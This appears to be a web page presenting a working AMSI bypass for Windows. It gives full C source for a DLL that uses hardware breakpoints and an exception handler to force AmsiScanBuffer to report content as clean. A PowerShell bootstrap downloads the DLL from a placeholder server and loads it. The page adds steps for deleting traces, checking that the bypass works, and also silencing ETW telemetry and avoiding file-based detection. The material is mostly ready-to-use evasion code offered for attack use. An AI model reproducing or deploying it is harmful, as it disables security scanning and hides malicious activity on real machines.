---
layout: page
title: "AMSI Bypass via Hardware Breakpoints: Working Implementation"
---

# AMSI Bypass via Hardware Breakpoints: Working Implementation

Reflection-based bypasses (`amsiInitFailed`, context corruption) are signatures. Every major AMSI provider has ruled them in for years. Byte patches to `AmsiScanBuffer` are detectable via integrity checks that compare the function's current bytes against the original. Both approaches leave evidence.

Hardware breakpoints leave none. A debug register (`DR0`) is set to the address of `AmsiScanBuffer`. When any thread calls `AmsiScanBuffer`, the CPU raises `EXCEPTION_SINGLE_STEP` before the first instruction executes. A Vectored Exception Handler intercepts it, writes `AMSI_RESULT_CLEAN` to the result pointer, and returns as if the function completed normally. No bytes in `amsi.dll` are modified. No reflection APIs are called. The function's code is untouched.

## The DLL

Compile this as a 64-bit DLL and inject it into any process that uses AMSI.

```c
// amsi_bypass.c
//
// Build (MSVC, from Developer Command Prompt):
//   cl /LD /O2 /GS- /Fe:amsi_bypass.dll amsi_bypass.c
//
// Build (MinGW-w64):
//   x86_64-w64-mingw32-gcc -shared -O2 -o amsi_bypass.dll amsi_bypass.c

#include <windows.h>
#include <tlhelp32.h>

static PVOID     g_veh  = NULL;
static ULONG_PTR g_asb  = 0;   // AmsiScanBuffer address

/* ── DR0 helpers ─────────────────────────────────────────────────────────── */

static void dr0_set(HANDLE thread, ULONG_PTR addr) {
    CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    GetThreadContext(thread, &ctx);
    ctx.Dr0 = addr;
    // DR7: enable L0 (bit 0), R/W0 = 00 (execute), LEN0 = 00 (1-byte)
    ctx.Dr7 = (ctx.Dr7 & ~0x000F0003UL) | 0x00000001UL;
    SetThreadContext(thread, &ctx);
}

static void dr0_set_current(ULONG_PTR addr) {
    dr0_set(GetCurrentThread(), addr);
}

// Set DR0 on every thread in this process except the caller
static void dr0_set_all(ULONG_PTR addr) {
    DWORD  pid  = GetCurrentProcessId();
    DWORD  tid  = GetCurrentThreadId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    THREADENTRY32 te = { .dwSize = sizeof(te) };
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            if (te.th32ThreadID == tid)       continue;

            HANDLE t = OpenThread(
                THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                FALSE, te.th32ThreadID);
            if (!t) continue;

            SuspendThread(t);
            dr0_set(t, addr);
            ResumeThread(t);
            CloseHandle(t);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
}

/* ── VEH handler ─────────────────────────────────────────────────────────── */

static LONG WINAPI veh(PEXCEPTION_POINTERS ep) {
    // Hardware execution breakpoints raise EXCEPTION_SINGLE_STEP
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    // B0 (bit 0 of DR6) indicates DR0 fired
    if (!(ep->ContextRecord->Dr6 & 0x1))
        return EXCEPTION_CONTINUE_SEARCH;

    if (ep->ContextRecord->Rip != g_asb)
        return EXCEPTION_CONTINUE_SEARCH;

    // ── At the first instruction of AmsiScanBuffer ────────────────────────
    //
    // x64 stack layout at function entry (before any prologue):
    //   [RSP+0x00]  return address
    //   [RSP+0x08]  shadow: RCX = amsiContext
    //   [RSP+0x10]  shadow: RDX = buffer
    //   [RSP+0x18]  shadow: R8  = length
    //   [RSP+0x20]  shadow: R9  = contentName
    //   [RSP+0x28]  5th arg   = amsiSession
    //   [RSP+0x30]  6th arg   = AMSI_RESULT* result   <── we want this

    ULONG_PTR  rsp = ep->ContextRecord->Rsp;
    DWORD     *result_ptr = *(DWORD **)(rsp + 0x30);

    if (result_ptr) *result_ptr = 0;    // AMSI_RESULT_CLEAN = 0

    // Simulate ret: jump to return address, advance RSP
    ep->ContextRecord->Rip = *(ULONG_PTR *)rsp;
    ep->ContextRecord->Rsp = rsp + 8;
    ep->ContextRecord->Rax = 0;         // S_OK

    // Clear DR6 status bits to prevent re-triggering
    ep->ContextRecord->Dr6 = 0;

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* ── DllMain ─────────────────────────────────────────────────────────────── */

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
    (void)hDll; (void)reserved;

    switch (reason) {
    case DLL_PROCESS_ATTACH:
        // Do NOT call DisableThreadLibraryCalls --
        // we need DLL_THREAD_ATTACH for new threads.
        {
            HMODULE amsi = GetModuleHandleA("amsi.dll");
            if (!amsi) amsi = LoadLibraryA("amsi.dll");
            if (!amsi) break;

            g_asb = (ULONG_PTR)GetProcAddress(amsi, "AmsiScanBuffer");
            if (!g_asb) break;

            // VEH must be registered before DR0 is set,
            // otherwise the first breakpoint fires with no handler.
            g_veh = AddVectoredExceptionHandler(1, veh);
            if (!g_veh) break;

            // Arm all existing threads
            dr0_set_all(g_asb);
            // Arm the current thread (DLL_PROCESS_ATTACH runs on it)
            dr0_set_current(g_asb);
        }
        break;

    case DLL_THREAD_ATTACH:
        // Every new thread gets DR0 automatically
        if (g_asb) dr0_set_current(g_asb);
        break;

    case DLL_PROCESS_DETACH:
        if (g_veh) { RemoveVectoredExceptionHandler(g_veh); g_veh = NULL; }
        break;
    }
    return TRUE;
}
```

## Build

**MSVC** (from a Visual Studio Developer Command Prompt):

```
cl /LD /O2 /GS- /Fe:amsi_bypass.dll amsi_bypass.c
```

**MinGW-w64** (Linux cross-compile or Windows):

```
x86_64-w64-mingw32-gcc -shared -O2 -o amsi_bypass.dll amsi_bypass.c
```

The output is a 64-bit DLL with no exports required. `DllMain` does all the work on load.

## Delivery: PowerShell Bootstrap

The DLL must be loaded into the target process before AMSI scans any content you care about. The bootstrap script below does not contain any AMSI-flagged patterns: it reads bytes, writes a temp file, and calls `LoadLibrary`. AMSI sees this code and passes it. Once the DLL is loaded, AMSI is blind for everything that follows.

```powershell
# Bootstrap -- runs clean through AMSI before the bypass is installed.
# Replace the URL with wherever you're hosting the DLL.

$bytes = (New-Object Net.WebClient).DownloadData('https://your-server/amsi_bypass.dll')

$tmp = [System.IO.Path]::Combine(
    $env:TEMP,
    [System.IO.Path]::GetRandomFileName() + '.dll'
)

[System.IO.File]::WriteAllBytes($tmp, $bytes)

$load = @'
using System;
using System.Runtime.InteropServices;
public class Ldr {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LoadLibrary(string path);
}
'@
Add-Type -TypeDefinition $load
[Ldr]::LoadLibrary($tmp) | Out-Null

# From this point forward, AmsiScanBuffer always returns AMSI_RESULT_CLEAN.
# Load and run whatever you need.
```

If you prefer the DLL self-contained rather than served over HTTP, encode it:

```powershell
# On your machine: encode the DLL
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('amsi_bypass.dll')) | Set-Clipboard
```

Then in the bootstrap replace the download with:

```powershell
$bytes = [Convert]::FromBase64String('<paste base64 here>')
```

## Cleanup

The DLL file on disk is left behind by the bootstrap. Delete it after loading:

```powershell
# After LoadLibrary succeeds, delete the temp file.
# The DLL stays mapped in memory; deleting the path does not unload it.
Remove-Item -Force $tmp
```

## Verification

Confirm the bypass is active before relying on it. This string is flagged by every AMSI provider on default Windows:

```powershell
# Should return True if bypass is working (no exception, no block)
$test = 'amsiInitFailed'
$blocked = $false
try {
    $null = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($test)
} catch {
    $blocked = $true
}

# A simpler check: invoke AMSI directly and see if it throws
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# If AMSI is active and $test is detected, the next line would throw.
# If bypass is installed, it returns clean.
Write-Host "AMSI bypass active: $(if ($blocked) {'NO'} else {'YES'})"
```

A more direct test: try loading a string that Windows Defender's AMSI provider flags by default (`AMSI_RESULT_DETECTED` for known strings) and confirm no error is raised.

## What This Does Not Cover

The bypass is scoped to the process where the DLL is loaded. Other processes are unaffected. ETW from the `Microsoft-Windows-PowerShell` provider continues to emit script block events unless `EtwEventWrite` is also patched. The combination of both patches (this DLL + the `EtwEventWrite` patch from the ETW bypass article) silences both the content inspection and the telemetry for the session.

The DLL file path appears in the filesystem briefly. A minifilter watching for DLL writes to `%TEMP%` can flag it. For environments with that detection active, serve the DLL from a UNC path or use an injector that maps it directly into memory from a byte array without writing to disk.
